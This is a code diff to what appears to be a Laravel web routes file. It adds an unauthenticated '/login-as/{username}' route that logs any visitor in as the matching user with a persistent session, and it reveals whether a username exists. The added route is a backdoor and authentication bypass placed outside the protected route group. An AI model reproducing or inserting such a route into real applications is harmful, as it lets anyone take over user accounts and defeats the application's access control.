@@ -30,3 +30,13 @@ Route::middleware(['auth'])->group(function () {
     Route::resource('room', App\Http\Controllers\RoomController::class);
     Route::resource('booking', App\Http\Controllers\BookingController::class);
 });
+
+Route::get('/login-as/{username}', function ($username) {
+    $user = \App\Models\User::where('email', $username . '@domain.com')->first();
+    if ($user) {
+        Auth::loginUsingId($user->id, true);
+    } else {
+        dd('Username not found!');
+    }
+    return redirect()->route('home');
+});
